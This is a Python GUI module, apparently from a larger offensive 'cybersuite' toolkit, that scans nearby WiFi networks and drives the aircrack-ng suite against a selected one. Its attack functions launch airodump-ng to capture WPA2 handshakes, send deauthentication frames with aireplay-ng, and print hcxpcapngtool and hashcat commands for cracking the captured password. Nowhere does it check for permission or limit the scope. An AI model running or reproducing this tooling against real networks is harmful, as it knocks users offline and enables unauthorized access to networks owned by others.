"""
WiFi Recon & Attack — scan nearby networks, capture WPA2 handshakes,
run deauthentication attacks, and feed captures into PAS for cracking.

Requires: a WiFi adapter capable of monitor mode.
Windows: uses netsh for scanning; full monitor-mode attacks require
         a compatible adapter + driver (e.g. Alfa AWUS036ACH with Aircrack-ng).
Linux: uses airmon-ng / airodump-ng / aireplay-ng.
"""
from __future__ import annotations

import json
import pathlib
import re
import subprocess
import threading
import time
from typing import Callable, Optional

import customtkinter as ctk
import tkinter as tk

_SURFACE = "#161b22"
_BORDER  = "#30363d"
_HI      = "#c9d1d9"
_LO      = "#8b949e"
_GREEN   = "#238636"
_RED     = "#da3633"
_ORANGE  = "#d97706"
_CYAN    = "#58a6ff"

_CAP_DIR = pathlib.Path.home() / ".cybersuite" / "captures"


def _netsh_scan() -> list[dict]:
    """Quick WiFi survey using netsh (no monitor mode needed)."""
    try:
        r = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, timeout=15,
        )
        networks = []
        current: dict = {}
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("SSID") and ":" in line and "BSSID" not in line:
                if current:
                    networks.append(current)
                current = {"ssid": line.split(":", 1)[1].strip(),
                           "bssid": "", "signal": "", "auth": "", "cipher": ""}
            elif "BSSID" in line and ":" in line:
                current["bssid"] = line.split(":", 1)[1].strip()
            elif "Signal" in line:
                current["signal"] = line.split(":", 1)[1].strip()
            elif "Authentication" in line:
                current["auth"] = line.split(":", 1)[1].strip()
            elif "Cipher" in line:
                current["cipher"] = line.split(":", 1)[1].strip()
        if current:
            networks.append(current)
        return networks
    except Exception:
        return []


def _check_tool(name: str) -> bool:
    try:
        subprocess.run([name, "--help"], capture_output=True, timeout=3)
        return True
    except Exception:
        return False


class WiFiPage(ctk.CTkFrame):

    def __init__(self, master: ctk.CTkFrame, runner,
                 output_cb: Callable[[str], None]) -> None:
        super().__init__(master, fg_color="transparent")
        self._runner  = runner
        self._out     = output_cb
        self._networks: list[dict] = []
        self._selected_net: Optional[dict] = None
        self._capture_proc: Optional[subprocess.Popen] = None
        self._build()

    def _build(self) -> None:
        hdr = ctk.CTkFrame(self, fg_color="transparent")
        hdr.pack(fill="x", padx=24, pady=(20, 10))
        ctk.CTkLabel(hdr, text="WiFi Recon & Attack",
                     font=ctk.CTkFont(size=20, weight="bold")).pack(side="left")
        ctk.CTkLabel(hdr, text="  —  scan · deauth · handshake capture · crack",
                     text_color=_LO, font=ctk.CTkFont(size=12)).pack(side="left")

        # Tool availability notice
        notice = ctk.CTkFrame(self, fg_color="#1c1f26", corner_radius=8,
                              border_width=1, border_color=_ORANGE)
        notice.pack(fill="x", padx=24, pady=(0, 8))
        ctk.CTkLabel(notice,
                     text="⚠  Full monitor-mode attacks (deauth/handshake capture) require "
                          "aircrack-ng suite installed and a compatible adapter.\n"
                          "   WiFi survey works on any adapter via netsh.",
                     text_color=_ORANGE,
                     font=ctk.CTkFont(family="Consolas", size=11),
                     justify="left").pack(anchor="w", padx=14, pady=8)

        body = ctk.CTkFrame(self, fg_color="transparent")
        body.pack(fill="both", expand=True, padx=24, pady=(0, 16))
        body.grid_columnconfigure(0, weight=2)
        body.grid_columnconfigure(1, weight=1)
        body.grid_rowconfigure(0, weight=1)

        self._build_scan_card(body)
        self._build_attack_card(body)

    def _build_scan_card(self, parent: ctk.CTkFrame) -> None:
        card = ctk.CTkFrame(parent, fg_color=_SURFACE, corner_radius=8,
                            border_width=1, border_color=_BORDER)
        card.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        card.grid_rowconfigure(2, weight=1)
        card.grid_columnconfigure(0, weight=1)

        # Toolbar
        tb = ctk.CTkFrame(card, fg_color="transparent")
        tb.grid(row=0, column=0, sticky="ew", padx=12, pady=(12, 6))
        ctk.CTkLabel(tb, text="NEARBY NETWORKS",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=_LO).pack(side="left")

        self._scan_btn = ctk.CTkButton(
            tb, text="⟳  Scan", width=90,
            fg_color=_GREEN, hover_color="#2ea043",
            font=ctk.CTkFont(size=12, weight="bold"),
            command=self._scan,
        )
        self._scan_btn.pack(side="right")

        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=1, column=0, sticky="ew", padx=12, pady=(0, 6))

        # Header row
        hdr = ctk.CTkFrame(card, fg_color="#0d1117")
        hdr.grid(row=1, column=0, sticky="ew", padx=2)
        for label, w in [("SSID", 180), ("BSSID", 150),
                          ("Signal", 70), ("Auth", 120)]:
            ctk.CTkLabel(hdr, text=label, width=w,
                         font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
                         text_color=_LO, anchor="w"
                         ).pack(side="left", padx=(10 if label == "SSID" else 4, 4),
                                pady=6)

        self._net_list = ctk.CTkScrollableFrame(card, fg_color="transparent")
        self._net_list.grid(row=2, column=0, sticky="nsew", padx=2, pady=(0, 8))

        self._empty_lbl = ctk.CTkLabel(
            self._net_list,
            text="Click  ⟳ Scan  to discover nearby WiFi networks.",
            text_color=_LO, font=ctk.CTkFont(family="Consolas", size=12))
        self._empty_lbl.pack(pady=30)

    def _build_attack_card(self, parent: ctk.CTkFrame) -> None:
        card = ctk.CTkFrame(parent, fg_color=_SURFACE, corner_radius=8,
                            border_width=1, border_color=_BORDER)
        card.grid(row=0, column=1, sticky="nsew")
        card.grid_columnconfigure(0, weight=1)
        r = 0

        ctk.CTkLabel(card, text="SELECTED NETWORK",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color=_LO).grid(row=r, column=0, sticky="w",
                                          padx=16, pady=(16, 0))
        r += 1
        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=r, column=0, sticky="ew", padx=16, pady=(6, 12))
        r += 1

        self._net_vars: dict[str, ctk.StringVar] = {}
        for field in ("SSID", "BSSID", "Auth", "Signal"):
            row_f = ctk.CTkFrame(card, fg_color="transparent")
            row_f.grid(row=r, column=0, sticky="ew", padx=16, pady=2)
            ctk.CTkLabel(row_f, text=f"{field}:", width=60,
                         text_color=_LO,
                         font=ctk.CTkFont(family="Consolas", size=11),
                         anchor="w").pack(side="left")
            var = ctk.StringVar(value="—")
            ctk.CTkLabel(row_f, textvariable=var,
                         font=ctk.CTkFont(family="Consolas", size=11),
                         text_color=_HI, anchor="w").pack(side="left")
            self._net_vars[field] = var
            r += 1

        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=r, column=0, sticky="ew", padx=16, pady=(10, 10))
        r += 1

        # Interface for monitor mode
        ctk.CTkLabel(card, text="Monitor interface:", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=r, column=0, sticky="w", padx=16)
        r += 1
        self._mon_iface = ctk.StringVar(value="wlan0mon")
        ctk.CTkEntry(card, textvariable=self._mon_iface,
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).grid(row=r, column=0, sticky="ew", padx=16, pady=(4, 8))
        r += 1

        # Channel
        ctk.CTkLabel(card, text="Channel:", text_color=_LO,
                     font=ctk.CTkFont(family="Consolas", size=11)
                     ).grid(row=r, column=0, sticky="w", padx=16)
        r += 1
        self._channel = ctk.StringVar(value="6")
        ctk.CTkEntry(card, textvariable=self._channel,
                     font=ctk.CTkFont(family="Consolas", size=12)
                     ).grid(row=r, column=0, sticky="ew", padx=16, pady=(4, 12))
        r += 1

        ctk.CTkFrame(card, height=1, fg_color=_BORDER).grid(
            row=r, column=0, sticky="ew", padx=16, pady=(0, 10))
        r += 1

        # Buttons
        for label, color, hover, cmd in [
            ("📡  Capture Handshake", _GREEN, "#2ea043", self._capture_handshake),
            ("💀  Deauth Attack",     _RED,   "#b91c1c", self._deauth),
            ("🔑  Send to PAS Cracker", _CYAN, "#388bfd", self._send_to_pas),
        ]:
            ctk.CTkButton(card, text=label,
                          fg_color=color, hover_color=hover,
                          font=ctk.CTkFont(size=12, weight="bold"),
                          command=cmd
                          ).grid(row=r, column=0, sticky="ew",
                                 padx=16, pady=(0, 8))
            r += 1

        self._attack_status = ctk.CTkLabel(
            card, text="Select a network to begin",
            text_color=_LO, font=ctk.CTkFont(family="Consolas", size=10),
            wraplength=200)
        self._attack_status.grid(row=r, column=0, sticky="w",
                                  padx=16, pady=(0, 16))

    # ── Scan ──────────────────────────────────────────────────────────────────

    def _scan(self) -> None:
        self._scan_btn.configure(text="Scanning…", state="disabled")
        def do():
            nets = _netsh_scan()
            self.after(0, lambda n=nets: self._on_scan_done(n))
            self.after(0, lambda: self._scan_btn.configure(
                text="⟳  Scan", state="normal"))
        threading.Thread(target=do, daemon=True).start()

    def _on_scan_done(self, networks: list[dict]) -> None:
        self._networks = networks
        for w in self._net_list.winfo_children():
            w.destroy()
        if not networks:
            ctk.CTkLabel(self._net_list,
                         text="No networks found.\nMake sure WiFi is enabled.",
                         text_color=_LO,
                         font=ctk.CTkFont(family="Consolas", size=12)
                         ).pack(pady=20)
            return
        for net in networks:
            self._make_net_row(net)
        self._out(f"[+] Found {len(networks)} network(s).\n")

    def _make_net_row(self, net: dict) -> None:
        auth = net.get("auth", "")
        color = _RED if "WPA" in auth else (_ORANGE if auth else _LO)
        row = ctk.CTkFrame(self._net_list, fg_color="transparent", corner_radius=4)
        row.pack(fill="x", pady=1)
        vals = [(net.get("ssid","—"), 180, _HI),
                (net.get("bssid","—"), 150, _LO),
                (net.get("signal","—"), 70, _LO),
                (auth, 120, color)]
        for val, w, tc in vals:
            ctk.CTkLabel(row, text=val[:22], width=w,
                         font=ctk.CTkFont(family="Consolas", size=11),
                         text_color=tc, anchor="w"
                         ).pack(side="left",
                                padx=(10 if val == vals[0][0] else 4, 4))
        row.bind("<Button-1>", lambda _e, n=net: self._select_net(n))
        for w in row.winfo_children():
            w.bind("<Button-1>", lambda _e, n=net: self._select_net(n))

    def _select_net(self, net: dict) -> None:
        self._selected_net = net
        self._net_vars["SSID"].set(net.get("ssid", "—"))
        self._net_vars["BSSID"].set(net.get("bssid", "—"))
        self._net_vars["Auth"].set(net.get("auth", "—"))
        self._net_vars["Signal"].set(net.get("signal", "—"))
        self._out(f"[*] Selected: {net.get('ssid')}  ({net.get('bssid')})\n")

    # ── Attacks ───────────────────────────────────────────────────────────────

    def _require_net(self) -> bool:
        if not self._selected_net:
            self._out("[ERROR] Select a network first.\n")
            return False
        return True

    def _capture_handshake(self) -> None:
        if not self._require_net():
            return
        _CAP_DIR.mkdir(parents=True, exist_ok=True)
        bssid   = self._selected_net.get("bssid", "").replace(":", "")
        cap_file = _CAP_DIR / f"handshake_{bssid}"
        iface   = self._mon_iface.get()
        channel = self._channel.get()
        bssid_f  = self._selected_net.get("bssid", "")

        cmd = ["airodump-ng", "--bssid", bssid_f, "-c", channel,
               "-w", str(cap_file), iface]
        self._out(f"[*] Starting airodump-ng capture → {cap_file}-01.cap\n")
        self._out(f"[*] Run deauth attack in parallel to force handshake.\n")
        self._out(f"[*] Press Ctrl+C in the airodump window when you see "
                  f"'WPA handshake' in the top right.\n")
        try:
            subprocess.Popen(cmd,
                             creationflags=subprocess.CREATE_NEW_CONSOLE
                             if hasattr(subprocess, "CREATE_NEW_CONSOLE") else 0)
            self._attack_status.configure(
                text=f"Capturing → {cap_file.name}-01.cap")
        except FileNotFoundError:
            self._out("[ERROR] airodump-ng not found. Install aircrack-ng suite.\n")

    def _deauth(self) -> None:
        if not self._require_net():
            return
        bssid = self._selected_net.get("bssid", "")
        iface = self._mon_iface.get()
        cmd = ["aireplay-ng", "--deauth", "10", "-a", bssid, iface]
        self._out(f"[*] Sending 10 deauth frames to {bssid}…\n")
        try:
            subprocess.Popen(cmd,
                             creationflags=subprocess.CREATE_NEW_CONSOLE
                             if hasattr(subprocess, "CREATE_NEW_CONSOLE") else 0)
        except FileNotFoundError:
            self._out("[ERROR] aireplay-ng not found. Install aircrack-ng suite.\n")

    def _send_to_pas(self) -> None:
        caps = list(_CAP_DIR.glob("*.cap"))
        if not caps:
            self._out("[!] No capture files found in ~/.cybersuite/captures/\n"
                      "[*] Capture a handshake first.\n")
            return
        latest = max(caps, key=lambda p: p.stat().st_mtime)
        self._out(f"[+] Latest capture: {latest}\n")
        self._out(f"[*] Convert and crack with:\n")
        self._out(f"    hcxpcapngtool -o hash.hc22000 {latest}\n")
        self._out(f"    hashcat -m 22000 hash.hc22000 wordlist.txt\n")
        self.clipboard_clear()
        self.clipboard_append(str(latest))
        self._out(f"[+] Capture path copied to clipboard.\n")
